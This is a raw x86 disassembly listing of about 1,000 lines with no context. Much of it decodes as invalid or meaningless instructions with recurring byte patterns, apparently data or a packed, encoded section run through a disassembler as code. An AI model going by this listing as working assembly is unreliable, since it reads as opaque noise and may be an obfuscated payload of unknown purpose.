  403820:	adc    dh,BYTE PTR [esi+0x2a]
  403823:	rol    BYTE PTR [ecx+0x40],cl
  403826:	ss sbb edi,edx
  403829:	and    eax,DWORD PTR [edx-0x26]
  40382c:	xor    DWORD PTR [ecx],ebp
  40382e:	inc    ecx
  40382f:	mov    edx,0x2016dcf8
  403834:	inc    esp
  403835:	retf   0x64b8
  403838:	or     eax,0x704e8029
  40383d:	ret    0xd9c3
  403840:	leave  
  403841:	add    eax,0x4041cc
  403846:	add    BYTE PTR [eax],al
  403848:	inc    eax
  403849:	inc    eax
  40384a:	inc    ebx
  40384b:	bound  eax,QWORD PTR [eax]
  40384d:	inc    eax
  40384e:	inc    eax
  40384f:	add    eax,0x62434162
  403854:	inc    eax
  403855:	js     0x403867
  403857:	inc    ecx
  403858:	add    eax,0x5404325
  40385d:	bound  eax,QWORD PTR [eax+0x40]
  403860:	inc    ecx
  403861:	inc    ebx
  403862:	sub    BYTE PTR [edx-0x5a],ah
  403865:	inc    edx
  403866:	xor    al,BYTE PTR [edi+0x2a]
  403869:	es ins DWORD PTR es:[edi],dx
  40386b:	(bad)  
  40386c:	fistp  QWORD PTR [edi]
  40386e:	lds    esi,FWORD PTR [ebx]
  403870:	mov    ecx,0x144f4243
  403875:	and    eax,0x436241
  40387a:	adc    BYTE PTR [eax+0x0],al
  40387d:	add    eax,0x62410040
  403882:	inc    eax
  403883:	add    BYTE PTR [ebx-0x34],al
  403886:	inc    eax
  403887:	add    eax,0x78434040
  40388c:	bound  eax,QWORD PTR [ecx+0x78]
  40388f:	add    eax,0x62404043
  403894:	and    al,0xc2
  403896:	je     0x403818
  403898:	pop    ebp
  403899:	mov    es,WORD PTR [eax-0x80]
  40389c:	pop    ebx
  40389d:	cmp    DWORD PTR [ebp+eax*8-0x14],esp
  4038a1:	cmp    eax,0x70111e68
  4038a6:	je     0x4038ec
  4038a8:	push   edx
  4038a9:	pusha  
  4038aa:	inc    ecx
  4038ab:	stos   BYTE PTR es:[edi],al
  4038ac:	inc    ecx
  4038ad:	inc    eax
  4038ae:	add    eax,0x43436240
  4038b3:	add    eax,0x62004040
  4038b8:	inc    eax
  4038b9:	add    BYTE PTR [ecx+0x40],al
  4038bc:	inc    ebx
  4038bd:	test   BYTE PTR ds:0x58054041,ah
  4038c3:	inc    eax
  4038c4:	inc    eax
  4038c5:	bound  eax,QWORD PTR [eax+0x66]
  4038c8:	inc    ecx
  4038c9:	inc    eax
  4038ca:	add    eax,0xa8c11d00
  4038cf:	dec    esp
  4038d0:	stc    
  4038d1:	adc    eax,0x55552645
  4038d6:	adc    bh,BYTE PTR [edi]
  4038d8:	div    BYTE PTR [edi+0x34]
  4038db:	clc    
  4038dc:	xchg   edx,eax
  4038dd:	jne    0x40393f
  4038df:	jge    0x4038e6
  4038e1:	sbb    al,BYTE PTR [ebx+edx*1+0x7a]
  4038e5:	ret    
  4038e6:	adc    BYTE PTR [edx+0x58],cl
  4038e9:	bound  esp,QWORD PTR [eax]
  4038eb:	rol    BYTE PTR [edi+0x1a],0xcb
  4038ef:	test   al,0xfb
  4038f1:	add    BYTE PTR [eax],al
  4038f3:	inc    ebx
  4038f4:	inc    eax
  4038f5:	bound  eax,QWORD PTR ds:0x25404110
  4038fb:	add    ah,cl
  4038fd:	inc    ebx
  4038fe:	add    eax,0x40402562
  403903:	add    BYTE PTR [eax+0x40],al
  403906:	inc    ecx
  403907:	inc    ecx
  403908:	add    eax,0x78434025
  40390d:	bound  eax,QWORD PTR [eax-0x7c]
  403910:	inc    eax
  403911:	inc    ecx
  403912:	pusha  
  403913:	in     eax,dx
  403914:	mov    eax,ds:0x11bfc138
  403919:	clc    
  40391a:	ins    BYTE PTR es:[edi],dx
  40391b:	les    ebp,FWORD PTR [ebp+0x6d]
  40391e:	inc    esp
  40391f:	mov    edi,0x4f29f4fc
  403924:	adc    eax,0x42c1c054
  403929:	push   esi
  40392a:	dec    eax
  40392b:	inc    eax
  40392c:	bound  esi,QWORD PTR [ecx-0x4d6d42df]
  403932:	inc    ebx
  403933:	fs cmp al,0x41
  403936:	inc    eax
  403937:	inc    eax
  403938:	inc    ebx
  403939:	int3   
  40393a:	add    BYTE PTR ds:0x56240,al
  403940:	inc    ebx
  403941:	inc    eax
  403942:	inc    eax
  403943:	add    BYTE PTR [ecx+0x62],al
  403946:	bound  eax,QWORD PTR [eax]
  403948:	int3   
  403949:	inc    eax
  40394a:	inc    ebx
  40394b:	add    eax,0x43624041
  403950:	adc    BYTE PTR [ecx+0x5],al
  403953:	inc    eax
  403954:	ficom  DWORD PTR [ebp-0x58]
  403957:	and    dl,dh
  403959:	xor    DWORD PTR [ecx],edi
  40395b:	push   0x62f9c2b4
  403960:	or     eax,0x22054301
  403965:	and    al,0xab
  403967:	push   edx
  403968:	sbb    BYTE PTR [eax+0x3343af7f],ch
  40396e:	dec    edx
  40396f:	sub    al,0x56
  403971:	bound  eax,QWORD PTR [ebx+0x40]
  403974:	adc    BYTE PTR ds:0x4158cc40,al
  40397a:	inc    ebx
  40397b:	bound  eax,QWORD PTR [ecx+0x40]
  40397e:	add    eax,0x4140
  403983:	and    eax,0x40400062
  403988:	add    eax,0x84404340
  40398d:	int3   
  40398e:	js     0x403990
  403990:	inc    ecx
  403991:	adc    BYTE PTR [edx+0xf],ah
  403994:	adc    BYTE PTR [eax],ch
  403996:	push   eax
  403997:	xor    ecx,eax
  403999:	dec    edx
  40399a:	mov    edi,0x6e915c5c
  40399f:	in     eax,dx
  4039a0:	push   esi
  4039a1:	fdivr  DWORD PTR [edi-0x6fc7fa07]
  4039a7:	dec    ebp
  4039a8:	ret    0x67b
  4039ab:	lock retf 
  4039ad:	addr16 inc edx
  4039af:	shr    DWORD PTR [ebx+0x4d11c987],1
  4039b5:	mov    al,ds:0xa860e425
  4039ba:	test   al,0xa
  4039bc:	stos   DWORD PTR es:[edi],eax
  4039bd:	arpl   WORD PTR [ecx+esi*4+0x2a],di
  4039c1:	adc    DWORD PTR [eax+0x5e],eax
  4039c4:	add    BYTE PTR [eax+0x41],al
  4039c7:	inc    eax
  4039c8:	inc    ebx
  4039c9:	bound  ax,DWORD PTR ds:0x40434100
  4039d0:	add    eax,0x40054062
  4039d5:	bound  eax,QWORD PTR [ecx+0x40]
  4039d8:	inc    ebx
  4039d9:	inc    eax
  4039da:	add    eax,0x25405841
  4039df:	bound  eax,QWORD PTR [eax+0x43]
  4039e2:	inc    eax
  4039e3:	adc    BYTE PTR [ebp+0x7f],al
  4039e6:	(bad)  
  4039e7:	jle    0x4039ab
  4039e9:	dec    eax
  4039ea:	inc    eax
  4039eb:	out    dx,al
  4039ec:	ja     0x403a2a
  4039ee:	scas   al,BYTE PTR es:[edi]
  4039ef:	jo     0x403a26
  4039f1:	retf   
  4039f2:	arpl   WORD PTR ds:0x7a4a445c,dx
  4039f8:	inc    ebx
  4039f9:	mov    eax,0xc663540e
  4039fe:	or     dh,BYTE PTR [eax+eax*8+0x5]
  403a02:	test   al,0xca
  403a04:	inc    eax
  403a05:	inc    ecx
  403a06:	inc    ebx
  403a07:	inc    eax
  403a08:	add    eax,0x43406262
  403a0d:	inc    ecx
  403a0e:	adc    BYTE PTR [eax],al
  403a10:	inc    eax
  403a11:	add    eax,0x43000562
  403a16:	add    BYTE PTR [ecx+0x40],al
  403a19:	inc    eax
  403a1a:	add    eax,0x400062
  403a1f:	inc    ebx
  403a20:	inc    eax
  403a21:	js     0x403a64
  403a23:	inc    ecx
  403a24:	bound  eax,QWORD PTR [eax+0x5c]
  403a27:	jle    0x403a7b
  403a29:	xchg   ecx,eax
  403a2a:	and    eax,DWORD PTR [ebp+0x47]
  403a2d:	sbb    DWORD PTR ds:0x2c4e981e,ecx
  403a33:	dec    ebx
  403a34:	inc    edi
  403a35:	cli    
  403a36:	retf   
  403a37:	bound  eax,QWORD PTR [ebx-0x6f]
  403a3a:	rcr    al,0xfc
  403a3d:	in     al,dx
  403a3e:	dec    edx
  403a3f:	inc    ecx
  403a40:	add    eax,0x263c3242
  403a45:	or     eax,0x5406234
  403a4a:	inc    ecx
  403a4b:	add    BYTE PTR [ebx+0x40],al
  403a4e:	inc    eax
  403a4f:	inc    ecx
  403a50:	inc    eax
  403a51:	inc    eax
  403a52:	bound  eax,QWORD PTR ds:0x5624300
  403a58:	add    BYTE PTR [eax+0x40],al
  403a5b:	add    BYTE PTR [ecx+0x43],al
  403a5e:	add    BYTE PTR [eax+0x41],al
  403a61:	add    eax,0x40436200
  403a66:	inc    eax
  403a67:	add    eax,0xd2653062
  403a6c:	jne    0x403a22
  403a6e:	and    eax,DWORD PTR [ecx+0x40]
  403a71:	mov    ss,eax
  403a73:	sub    eax,ecx
  403a75:	arpl   bp,dx
  403a77:	adc    DWORD PTR [esp+eax*8-0x19],ebx
  403a7b:	scas   al,BYTE PTR es:[edi]
  403a7c:	adc    eax,0x3d406298
  403a81:	dec    edi
  403a82:	stos   BYTE PTR es:[edi],al
  403a83:	or     DWORD PTR [ebx],ebp
  403a85:	inc    ecx
  403a86:	inc    edi
  403a87:	pop    esp
  403a88:	ret    
  403a89:	inc    eax
  403a8a:	or     edx,ecx
  403a8c:	sar    DWORD PTR [ecx],0x9c
  403a8f:	stc    
  403a90:	nop
  403a91:	pusha  
  403a92:	iret   
  403a93:	inc    eax
  403a94:	inc    esp
  403a95:	ins    BYTE PTR es:[edi],dx
  403a96:	inc    edx
  403a97:	inc    esp
  403a98:	mov    edi,0xc1d0173a
  403a9d:	inc    ecx
  403a9e:	inc    eax
  403a9f:	add    eax,0x41624340
  403aa4:	test   BYTE PTR [eax],al
  403aa6:	and    eax,0x404043
  403aab:	add    BYTE PTR ds:0x626210,al
  403ab1:	add    eax,0x43404140
  403ab6:	inc    eax
  403ab7:	inc    ecx
  403ab8:	add    eax,0x10664062
  403abd:	inc    ebx
  403abe:	bound  ebx,QWORD PTR [eax-0x58]
  403ac1:	inc    esi
  403ac2:	inc    eax
  403ac3:	ret    
  403ac4:	cs pusha 
  403ac6:	popa   
  403ac7:	xor    eax,0xbc49da62
  403acc:	leave  
  403acd:	inc    edx
  403ace:	ret    
  403acf:	dec    ebx
  403ad0:	jb     0x403aff
  403ad2:	inc    esp
  403ad3:	adc    eax,0x3a57f4e9
  403ad8:	bound  ebp,QWORD PTR [eax+0x22494630]
  403ade:	lds    ebx,FWORD PTR [esi+0x40]
  403ae1:	adc    BYTE PTR [esi],bl
  403ae3:	add    eax,0x4041cc
  403ae8:	add    BYTE PTR [eax],al
  403aea:	inc    eax
  403aeb:	inc    eax
  403aec:	inc    ebx
  403aed:	bound  eax,QWORD PTR [eax]
  403aef:	inc    eax
  403af0:	inc    eax
  403af1:	add    eax,0x62434162
  403af6:	inc    eax
  403af7:	js     0x403b09
  403af9:	inc    ecx
  403afa:	add    eax,0x5404325
  403aff:	bound  eax,QWORD PTR [eax+0x40]
  403b02:	inc    ecx
  403b03:	inc    ebx
  403b04:	inc    ecx
  403b05:	adc    DWORD PTR [edi+0x4c],edi
  403b08:	xor    eax,DWORD PTR [eax-0x68]
  403b0b:	test   al,0x30
  403b0d:	rcl    DWORD PTR [ecx+0x41bd2dce],1
  403b13:	data16 fwait
  403b15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b16:	inc    edx
  403b17:	adc    al,0x62
  403b19:	imul   edx,DWORD PTR [ecx],0x3206c452
  403b1f:	ins    DWORD PTR es:[edi],dx
  403b20:	jb     0x403af6
  403b22:	lods   al,BYTE PTR ds:[esi]
  403b23:	push   edx
  403b24:	dec    edi
  403b25:	es and eax,0x436241
  403b2b:	adc    BYTE PTR [eax+0x0],al
  403b2e:	add    eax,0x62410040
  403b33:	inc    eax
  403b34:	add    BYTE PTR [ebx-0x34],al
  403b37:	inc    eax
  403b38:	add    eax,0x78434040
  403b3d:	bound  eax,QWORD PTR [ecx+0x78]
  403b40:	add    eax,0x62404043
  403b45:	cmp    eax,0x63a8d042
  403b4a:	dec    ebp
  403b4b:	inc    eax
  403b4c:	xchg   esp,eax
  403b4d:	xchg   esi,eax
  403b4e:	jg     0x403bc7
  403b50:	inc    edx
  403b51:	mov    ah,0xab
  403b53:	pop    esp
  403b54:	sub    al,0x41
  403b56:	mov    edx,0x48692a32
  403b5b:	cmp    ebp,ebx
  403b5d:	shr    bh,1
  403b5f:	inc    ecx
  403b60:	inc    eax
  403b61:	add    eax,0x43436240
  403b66:	add    eax,0x62004040
  403b6b:	inc    eax
  403b6c:	add    BYTE PTR [ecx+0x40],al
  403b6f:	inc    ebx
  403b70:	test   BYTE PTR ds:0x58054041,ah
  403b76:	inc    eax
  403b77:	inc    eax
  403b78:	bound  eax,QWORD PTR [eax+0x66]
  403b7b:	inc    ecx
  403b7c:	inc    eax
  403b7d:	add    eax,0x15456900
  403b82:	or     al,0xc3
  403b84:	ss jnp 0x403bca
  403b87:	arpl   WORD PTR [edx],bp
  403b89:	arpl   WORD PTR [edi],bp
  403b8b:	mov    esp,0x7e514962
  403b90:	adc    DWORD PTR [eax-0xd36baa8],ecx
  403b96:	inc    eax
  403b97:	xor    al,0x80
  403b99:	mov    BYTE PTR ds:0x2d255167,al
  403b9f:	sbb    eax,0x68cb130d
  403ba4:	mov    cl,0xc0
  403ba6:	dec    ecx
  403ba7:	out    dx,al
  403ba8:	int    0xe4
  403baa:	add    BYTE PTR [eax],al
  403bac:	inc    ebx
  403bad:	inc    eax
  403bae:	bound  eax,QWORD PTR ds:0x25404110
  403bb4:	add    ah,cl
  403bb6:	inc    ebx
  403bb7:	add    eax,0x40402562
  403bbc:	add    BYTE PTR [eax+0x40],al
  403bbf:	inc    ecx
  403bc0:	inc    ecx
  403bc1:	add    eax,0x78434025
  403bc6:	bound  eax,QWORD PTR [eax-0x7c]
  403bc9:	inc    eax
  403bca:	inc    ecx
  403bcb:	dec    edx
  403bcc:	bound  ecx,QWORD PTR [ecx+edx*1+0x42]
  403bd0:	push   edi
  403bd1:	adc    BYTE PTR [edi+0x7fbe4234],dh
  403bd7:	sub    DWORD PTR [ebx-0x14],ecx
  403bda:	out    dx,al
  403bdb:	inc    edx
  403bdc:	test   al,0xab
  403bde:	mov    cl,0x53
  403be0:	clc    
  403be1:	add    eax,0xbe0a7598
  403be6:	xor    eax,0x644a4040
  403beb:	fsubr  st(2),st
  403bed:	jno    0x403be0
  403bef:	xor    al,0x87
  403bf1:	inc    edi
  403bf2:	and    eax,0x41dd4b52
  403bf7:	inc    eax
  403bf8:	inc    eax
  403bf9:	inc    ebx
  403bfa:	int3   
  403bfb:	add    BYTE PTR ds:0x56240,al
  403c01:	inc    ebx
  403c02:	inc    eax
  403c03:	inc    eax
  403c04:	add    BYTE PTR [ecx+0x62],al
  403c07:	bound  eax,QWORD PTR [eax]
  403c09:	int3   
  403c0a:	inc    eax
  403c0b:	inc    ebx
  403c0c:	add    eax,0x43624041
  403c11:	adc    BYTE PTR [ecx+0x5],al
  403c14:	inc    eax
  403c15:	push   eax
  403c16:	cmp    DWORD PTR [eax-0xbf09d24],0x541543c
  403c20:	in     al,dx
  403c21:	ds xor al,0x56
  403c24:	sub    bh,ch
  403c26:	xchg   ebp,eax
  403c27:	retf   
  403c28:	add    eax,0xd2a83510
  403c2d:	cmp    ebx,DWORD PTR [edi+0x10]
  403c30:	xchg   DWORD PTR [edx+0x2a],esp
  403c33:	inc    eax
  403c34:	pop    edi
  403c35:	imul   esp,DWORD PTR [edx+0x43],0x40
  403c39:	adc    BYTE PTR ds:0x4158cc40,al
  403c3f:	inc    ebx
  403c40:	bound  eax,QWORD PTR [ecx+0x40]
  403c43:	add    eax,0x4140
  403c48:	and    eax,0x40400062
  403c4d:	add    eax,0x84404340
  403c52:	int3   
  403c53:	js     0x403c55
  403c55:	inc    ecx
  403c56:	adc    BYTE PTR [edx+0xf],ah
  403c59:	inc    eax
  403c5a:	xor    al,0x40
  403c5c:	popa   
  403c5d:	es test dl,0x71
  403c61:	das    
  403c62:	inc    esi
  403c63:	inc    ecx
  403c64:	xor    al,0xd4
  403c66:	rol    BYTE PTR [bx+di+0x13],1
  403c6a:	das    
  403c6b:	xchg   ebx,eax
  403c6c:	inc    eax
  403c6d:	push   edx
  403c6e:	sub    ebx,0x20984058
  403c74:	mov    ah,0xd0
  403c76:	push   0x556039e9
  403c7b:	add    eax,0xaf634841
  403c80:	arpl   WORD PTR [ecx-0x40],bx
  403c83:	xchg   DWORD PTR [ebx+0x29],esi
  403c86:	inc    ecx
  403c87:	dec    esp
  403c88:	adc    DWORD PTR [eax+0x62],eax
  403c8b:	dec    edx
  403c8c:	or     BYTE PTR [eax],al
  403c8e:	inc    eax
  403c8f:	inc    ecx
  403c90:	inc    eax
  403c91:	inc    ebx
  403c92:	bound  ax,DWORD PTR ds:0x40434100
  403c99:	add    eax,0x40054062
  403c9e:	bound  eax,QWORD PTR [ecx+0x40]
  403ca1:	inc    ebx
  403ca2:	inc    eax
  403ca3:	add    eax,0x25405841
  403ca8:	bound  eax,QWORD PTR [eax+0x43]
  403cab:	inc    eax
  403cac:	adc    bl,al
  403cae:	sub    ah,BYTE PTR [ecx+0x43]
  403cb1:	and    DWORD PTR [esi-0x1a],ebx
  403cb4:	push   edx
  403cb5:	test   al,0x58
  403cb7:	aam    0x13
  403cb9:	sub    ebp,DWORD PTR [eax+0x35406ae6]
  403cbf:	fadd   DWORD PTR [edx+0x40]
  403cc2:	push   eax
  403cc3:	test   al,0x8c
  403cc5:	inc    eax
  403cc6:	inc    ecx
  403cc7:	inc    ebx
  403cc8:	inc    eax
  403cc9:	add    eax,0x43406262
  403cce:	inc    ecx
  403ccf:	adc    BYTE PTR [eax],al
  403cd1:	inc    eax
  403cd2:	add    eax,0x43000562
  403cd7:	add    BYTE PTR [ecx+0x40],al
  403cda:	inc    eax
  403cdb:	add    eax,0x400062
  403ce0:	inc    ebx
  403ce1:	inc    eax
  403ce2:	js     0x403d25
  403ce4:	inc    ecx
  403ce5:	bound  eax,QWORD PTR [eax+0x2a]
  403ce8:	inc    eax
  403ce9:	dec    ebx
  403cea:	ja     0x403d03
  403cec:	sub    dh,BYTE PTR [eax+eiz*8+0x41]
  403cf0:	dec    eax
  403cf1:	push   ecx
  403cf2:	js     0x403cde
  403cf4:	inc    edx
  403cf5:	push   0x14
  403cf7:	retf   
  403cf8:	cmp    DWORD PTR [edx+0x52],eax
  403cfb:	inc    ebx
  403cfc:	or     al,0x62
  403cfe:	test   al,0x28
  403d00:	ret    
  403d01:	in     eax,0x2f
  403d03:	inc    esi
  403d04:	in     al,dx
  403d05:	dec    eax
  403d06:	lds    edi,FWORD PTR [ebx+0x48]
  403d09:	jp     0x403d87
  403d0b:	dec    edx
  403d0c:	mov    BYTE PTR [ebx-0x41],dl
  403d0f:	call   0x5809f21
  403d14:	inc    ecx
  403d15:	add    BYTE PTR [ebx+0x40],al
  403d18:	inc    eax
  403d19:	inc    ecx
  403d1a:	inc    eax
  403d1b:	inc    eax
  403d1c:	bound  eax,QWORD PTR ds:0x5624300
  403d22:	add    BYTE PTR [eax+0x40],al
  403d25:	add    BYTE PTR [ecx+0x43],al
  403d28:	add    BYTE PTR [eax+0x41],al
  403d2b:	add    eax,0x40436200
  403d30:	inc    eax
  403d31:	add    eax,0x4070a762
  403d36:	test   al,0x3d
  403d38:	bound  esp,QWORD PTR [edx-0x35]
  403d3b:	xor    bl,dh
  403d3d:	dec    ebp
  403d3e:	js     0x403d97
  403d40:	xor    DWORD PTR [edi+0x48],edi
  403d43:	xchg   BYTE PTR [eax],dl
  403d45:	inc    eax
  403d46:	add    al,BYTE PTR cs:[eax]
  403d49:	call   0x6990c6dd
  403d4e:	ds inc ecx
  403d50:	inc    eax
  403d51:	add    eax,0x41624340
  403d56:	test   BYTE PTR [eax],al
  403d58:	and    eax,0x404043
  403d5d:	add    BYTE PTR ds:0x626210,al
  403d63:	add    eax,0x43404140
  403d68:	inc    eax
  403d69:	inc    ecx
  403d6a:	add    eax,0x10664062
  403d6f:	inc    ebx
  403d70:	bound  ebp,QWORD PTR [eax-0x3bf7edae]
  403d76:	das    
  403d77:	inc    eax
  403d78:	js     0x403d8b
  403d7a:	mov    bl,0x50
  403d7c:	bound  ebp,QWORD PTR ds:0x84622d3f
  403d82:	sub    BYTE PTR ds:0xc091c0b0,dl
  403d88:	cmp    eax,0x5cb7f0d
  403d8d:	jns    0x403d72
  403d8f:	jns    0x403dc5
  403d91:	retf   
  403d92:	sbb    eax,0xcc058740
  403d97:	inc    ecx
  403d98:	inc    eax
  403d99:	add    BYTE PTR [eax],al
  403d9b:	add    BYTE PTR [eax+0x40],al
  403d9e:	inc    ebx
  403d9f:	bound  eax,QWORD PTR [eax]
  403da1:	inc    eax
  403da2:	inc    eax
  403da3:	add    eax,0x62434162
  403da8:	inc    eax
  403da9:	js     0x403dbb
  403dab:	inc    ecx
  403dac:	add    eax,0x5404325
  403db1:	bound  eax,QWORD PTR [eax+0x40]
  403db4:	inc    ecx
  403db5:	inc    ebx
  403db6:	jae    0x403da8
  403db8:	inc    eax
  403db9:	arpl   WORD PTR [ecx+0x21],ax
  403dbc:	inc    edx
  403dbd:	push   0x77343205
  403dc2:	sub    ah,BYTE PTR [edi+0x1a]
  403dc5:	inc    ecx
  403dc6:	mov    edi,0x5a42db43
  403dcb:	fwait
  403dcc:	sub    BYTE PTR [ebx-0xf],dl
  403dcf:	and    eax,0x436241
  403dd4:	adc    BYTE PTR [eax+0x0],al
  403dd7:	add    eax,0x62410040
  403ddc:	inc    eax
  403ddd:	add    BYTE PTR [ebx-0x34],al
  403de0:	inc    eax
  403de1:	add    eax,0x78434040
  403de6:	bound  eax,QWORD PTR [ecx+0x78]
  403de9:	add    eax,0x62404043
  403dee:	rol    BYTE PTR [ecx-0x6f],1
  403df1:	inc    edi
  403df2:	ins    BYTE PTR es:[edi],dx
  403df3:	call   0xd16d801c
  403df8:	push   ebx
  403df9:	enter  0xd63,0x62
  403dfd:	jp     0x403e7d
  403dff:	inc    eax
  403e00:	inc    ebx
  403e01:	sub    al,0x31
  403e03:	int    0xd4
  403e05:	push   ebx
  403e06:	inc    edi
  403e07:	das    
  403e08:	rol    BYTE PTR [esi+0x33],1
  403e0b:	inc    esp
  403e0c:	inc    ecx
  403e0d:	inc    eax
  403e0e:	add    eax,0x43436240
  403e13:	add    eax,0x62004040
  403e18:	inc    eax
  403e19:	add    BYTE PTR [ecx+0x40],al
  403e1c:	inc    ebx
  403e1d:	test   BYTE PTR ds:0x58054041,ah
  403e23:	inc    eax
  403e24:	inc    eax
  403e25:	bound  eax,QWORD PTR [eax+0x66]
  403e28:	inc    ecx
  403e29:	inc    eax
  403e2a:	add    eax,0x92116300
  403e2f:	jecxz  0x403e59
  403e31:	sub    al,0x1
  403e33:	sti    
  403e34:	shl    BYTE PTR [ebx+0x34],cl
  403e37:	dec    eax
  403e38:	inc    eax
  403e39:	xchg   esp,eax
  403e3a:	arpl   WORD PTR [eax+0x684fd9a8],bx
  403e40:	sub    dl,BYTE PTR [eax+eiz*1+0x564315]
  403e47:	add    BYTE PTR [ebx+0x40],al
  403e4a:	bound  eax,QWORD PTR ds:0x25404110
  403e50:	add    ah,cl
  403e52:	inc    ebx
  403e53:	add    eax,0x40402562
  403e58:	add    BYTE PTR [eax+0x40],al
  403e5b:	inc    ecx
  403e5c:	inc    ecx
  403e5d:	add    eax,0x78434025
  403e62:	bound  eax,QWORD PTR [eax-0x7c]
  403e65:	inc    eax
  403e66:	inc    ecx
  403e67:	repnz inc eax
  403e69:	inc    edx
  403e6a:	test   al,0xb1
  403e6c:	leave  
  403e6d:	sub    bl,BYTE PTR [esi+0x7c]
  403e70:	hlt    
  403e71:	retf   0x2967
  403e74:	adc    BYTE PTR es:[ebp+0x41],dh
  403e78:	pop    ds
  403e79:	push   esp
  403e7a:	pop    ebx
  403e7b:	push   ds
  403e7c:	inc    ecx
  403e7d:	pop    esp
  403e7e:	pop    esp
  403e7f:	shl    BYTE PTR [ecx],cl
  403e81:	inc    ecx
  403e82:	inc    eax
  403e83:	inc    eax
  403e84:	inc    ebx
  403e85:	int3   
  403e86:	add    BYTE PTR ds:0x56240,al
  403e8c:	inc    ebx
  403e8d:	inc    eax
  403e8e:	inc    eax
  403e8f:	add    BYTE PTR [ecx+0x62],al
  403e92:	bound  eax,QWORD PTR [eax]
  403e94:	int3   
  403e95:	inc    eax
  403e96:	inc    ebx
  403e97:	add    eax,0x43624041
  403e9c:	adc    BYTE PTR [ecx+0x5],al
  403e9f:	inc    eax
  403ea0:	bound  esp,QWORD PTR [edx+0x70]
  403ea3:	sbb    al,0x43
  403ea5:	jb     0x403f25
  403ea7:	inc    esp
  403ea8:	adc    BYTE PTR fs:[ebx-0x38],ah
  403eac:	sbb    al,0xde
  403eae:	jae    0x403f1f
  403eb0:	aam    0x84
  403eb2:	push   ecx
  403eb3:	pop    ebx
  403eb4:	fsub   DWORD PTR [ebp+0x5d95b36]
  403eba:	test   al,0x3c
  403ebc:	adc    dl,BYTE PTR [ebp+edx*1+0x62cd0a45]
  403ec3:	inc    ebx
  403ec4:	inc    eax
  403ec5:	adc    BYTE PTR ds:0x4158cc40,al
  403ecb:	inc    ebx
  403ecc:	bound  eax,QWORD PTR [ecx+0x40]
  403ecf:	add    eax,0x4140
  403ed4:	and    eax,0x40400062
  403ed9:	add    eax,0x84404340
  403ede:	int3   
  403edf:	js     0x403ee1
  403ee1:	inc    ecx
  403ee2:	adc    BYTE PTR [edx+0xf],ah
  403ee5:	adc    dl,BYTE PTR [eax+eiz*2-0x3b9e8360]
  403eec:	adc    dl,al
  403eee:	sub    DWORD PTR [edx+0x5240bebe],eax
  403ef4:	lock adc eax,0xbffac3d9
  403efa:	daa    
  403efb:	xchg   edi,eax
  403efc:	adc    eax,0xe04104cd
  403f01:	inc    eax
  403f02:	jno    0x403ec0
  403f04:	int    0x11
  403f06:	call   0x4080b03e
  403f0b:	push   ebx
  403f0c:	inc    ebp
  403f0d:	cwde   
  403f0e:	pop    es
  403f0f:	mov    fs:0x2d652f60,eax
  403f15:	or     eax,0xc2bf62ea
  403f1a:	sbb    cl,BYTE PTR [edx]
  403f1c:	add    BYTE PTR [eax+0x41],al
  403f1f:	inc    eax
  403f20:	inc    ebx
  403f21:	bound  ax,DWORD PTR ds:0x40434100
  403f28:	add    eax,0x40054062
  403f2d:	bound  eax,QWORD PTR [ecx+0x40]
  403f30:	inc    ebx
  403f31:	inc    eax
  403f32:	add    eax,0x25405841
  403f37:	bound  eax,QWORD PTR [eax+0x43]
  403f3a:	inc    eax
  403f3b:	adc    BYTE PTR [esi+eax*2],dh
  403f3e:	inc    edx
  403f3f:	stos   DWORD PTR es:[edi],eax
  403f40:	and    dl,BYTE PTR [ebx+edx*2]
  403f43:	ins    DWORD PTR es:[edi],dx
  403f44:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f46:	and    al,0x4f
  403f48:	gs inc eax
  403f4a:	inc    eax
  403f4b:	push   ebx
  403f4c:	arpl   WORD PTR [eax+0x7d4afd86],dx
  403f52:	and    ecx,ecx
  403f54:	and    DWORD PTR [ebp-0x58],edx
  403f57:	fsubr  QWORD PTR [eax+0x67d0476f]
  403f5d:	xchg   DWORD PTR [eax],edx
  403f5f:	test   al,0x0
  403f61:	inc    ebx
  403f62:	inc    eax
  403f63:	bound  esp,QWORD PTR [eax]
  403f65:	xor    al,0xac
  403f67:	adc    DWORD PTR [ebx+0x60062409],esi
  403f6d:	ins    DWORD PTR es:[edi],dx
  403f6e:	inc    ecx
  403f6f:	pop    esp
  403f70:	xchg   esi,eax
  403f71:	ja     0x403fc2
  403f73:	add    BYTE PTR [eax+0x41],0x43
  403f77:	inc    eax
  403f78:	add    eax,0x43406262
  403f7d:	inc    ecx
  403f7e:	adc    BYTE PTR [eax],al
  403f80:	inc    eax
  403f81:	add    eax,0x43000562
  403f86:	add    BYTE PTR [ecx+0x40],al
  403f89:	inc    eax
  403f8a:	add    eax,0x400062
  403f8f:	inc    ebx
  403f90:	inc    eax
  403f91:	js     0x403fd4
  403f93:	inc    ecx
  403f94:	bound  eax,QWORD PTR [eax+0x62]
  403f97:	gs pop ebx
  403f99:	inc    ecx
  403f9a:	pushf  
  403f9b:	dec    edx
  403f9c:	inc    eax
  403f9d:	ss (bad) 
  403f9f:	call   0x30d486dc
  403fa4:	xor    BYTE PTR [eax],cl
  403fa6:	dec    edi
  403fa7:	test   DWORD PTR [eax-0x6c],edx
  403faa:	and    eax,DWORD PTR [ebx+eax*2]
  403fad:	bound  eax,QWORD PTR gs:[eax+0x5]
  403fb1:	inc    ecx
  403fb2:	add    BYTE PTR [ebx+0x40],al
  403fb5:	inc    eax
  403fb6:	inc    ecx
  403fb7:	inc    eax
  403fb8:	inc    eax
  403fb9:	bound  eax,QWORD PTR ds:0x5624300
  403fbf:	add    BYTE PTR [eax+0x40],al
  403fc2:	add    BYTE PTR [ecx+0x43],al
  403fc5:	add    BYTE PTR [eax+0x41],al
  403fc8:	add    eax,0x40436200
  403fcd:	inc    eax
  403fce:	add    eax,0x2a91bb62
  403fd3:	adc    al,0x42
  403fd6:	inc    eax
  403fd7:	jmp    0xc3d2a30e
  403fdc:	dec    edi
  403fdd:	xor    BYTE PTR [ebx],ch
  403fdf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403fe0:	cld    
  403fe1:	out    0xbf,al
  403fe3:	mov    esp,0x62ea03dd
  403fe8:	add    eax,0x5404115
  403fed:	inc    eax
  403fee:	inc    ebx
  403fef:	bound  eax,QWORD PTR [ecx-0x7c]
  403ff2:	add    BYTE PTR ds:0x404043,ah
  403ff8:	add    BYTE PTR ds:0x626210,al
  403ffe:	add    eax,0x43404140
  404003:	inc    eax
  404004:	inc    ecx
